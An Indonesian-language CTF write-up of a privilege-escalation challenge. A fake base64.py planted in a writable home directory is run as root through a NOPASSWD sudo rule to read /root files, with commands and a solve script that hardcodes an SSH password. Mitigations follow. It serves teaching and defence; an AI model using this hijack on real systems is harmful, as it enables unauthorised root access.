# 352 - hijacking (Binary Exploitation, picoCTF 2023, Medium)

## Challenge Metadata
- ID: 352 | Event: picoCTF 2023 | Author: CyLab Academy
- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 200
- Flag: `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`

## Problem Statement & Scope
Tantangan memberikan akses terminal interaktif via SSH (`academy@chatelaine.cylabacademy.net:port`, password pada instans). Di direktori home user (`/home/academy`) terdapat script tersembunyi milik root `.server.py`. Pengguna diarahkan untuk menaikkan hak akses (privilege escalation) ke superuser root untuk membaca berkas rahasia sistem.

## Teori & Akar Kerentanan (Root Cause)
1. **Python Module Import Precedence (`sys.path[0]`):**
   Ketika script Python dijalankan (`python3 /path/to/script.py`), interpreter Python secara otomatis menyisipkan direktori tempat script berada ke indeks pertama pustaka pencarian modul (`sys.path[0]`).
2. **Sudoers NOPASSWD Misconfiguration:**
   Audit hak akses dengan `sudo -l` menunjukkan aturan khusus:
   ```text
   User academy may run the following commands on challenge:
       (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
   ```
   Script `.server.py` berada di direktori `/home/academy/`. Meskipun berkas `.server.py` sendiri berstatus *read-only* bagi user biasa (`-rw-r--r-- 1 root root`), direktori induknya (`/home/academy`) dimiliki oleh user biasa (`drwxr-x--- 1 academy academy`), sehingga user memiliki hak tulis untuk membuat berkas baru.
3. **Pustaka yang Diimpor `.server.py`:**
   Script mengimpor modul bawaan Python:
   ```python
   import base64
   import os
   import socket
   ```
   Karena direktori `/home/academy/` writable dan diposisikan pada `sys.path[0]`, pembuatan berkas tiruan `base64.py` di direktori tersebut menyebabkan interpreter memuat berkas lokal tersebut dengan hak akses root alih-alih modul bawaan Python.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Akses SSH & Audit Izin Sudo:**
   Menghubungkan terminal via SSH dan memeriksa batasan hak akses:
   ```bash
   sudo -l
   # Hasil: (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
   ```
2. **Inspeksi Script Target & Direktori:**
   Membaca kode `.server.py` dan memverifikasi izin direktori kerja:
   ```bash
   ls -ld /home/academy
   # Hasil: drwxr-x--- 1 academy academy
   ```
3. **Pembuatan Pustaka Bajakan (`base64.py`):**
   Membuat modul palsu yang mengeksekusi perintah shell untuk membaca berkas rahasia:
   ```bash
   echo 'import os; os.system("cat /root/flag.txt /root/.* 2>/dev/null")' > /home/academy/base64.py
   ```
4. **Trigger Eksekusi Root via Sudo:**
   Menjalankan script melalui perintah sudo tanpa password:
   ```bash
   sudo /usr/bin/python3 /home/academy/.server.py
   ```
   Interpreter mengeksekusi payload di `base64.py` dengan UID 0 (root), menampilkan flag resmi:
   `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`.

## Script Reproduksi & PoC
Implementasi otomasi Python mandiri tersedia pada `scripts/solve_352_hijacking.py`:
```python
import subprocess, re

cmd = [
    "sshpass", "-p", "qX7p-yZ0EX",
    "ssh", "-o", "StrictHostKeyChecking=no", "-p", "28040",
    "academy@chatelaine.cylabacademy.net",
    'echo "import os; os.system(\\"cat /root/flag.txt /root/.* 2>/dev/null\\")" > /home/academy/base64.py && '
    'sudo /usr/bin/python3 /home/academy/.server.py'
]
proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
flag = re.search(r"academy\{[^\}]+\}", proc.stdout).group(0)
print("Flag:", flag)
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Isolasi Kepemilikan Direktori Script Sudo:**
   Script administratif yang didelegasikan melalui sudoers harus selalu ditempatkan di direktori aman milik root dengan izin restricted (misal `/usr/local/bin` atau `/opt/scripts`), bukan di direktori pengguna (`/home/<user>`).
2. **Pembersihan atau Pembatasan `PYTHONPATH` & Opsi `-I`:**
   Menjalankan Python dalam mode terisolasi menggunakan flag `-I` (Isolated mode: mengabaikan environment variables dan direktori script pada sys.path) pada definisi sudoers:
   ```text
   academy ALL=(root) NOPASSWD: /usr/bin/python3 -I /opt/scripts/.server.py
   ```
3. **Relevansi Modul LKS:**
   Topik kritis pada silabus LKS Cyber Security Nasional (Modul Linux Privilege Escalation & Python Library Hijacking Analysis) serta pemenuhan standar audit pengujian integritas kode NIST SP 800-115.
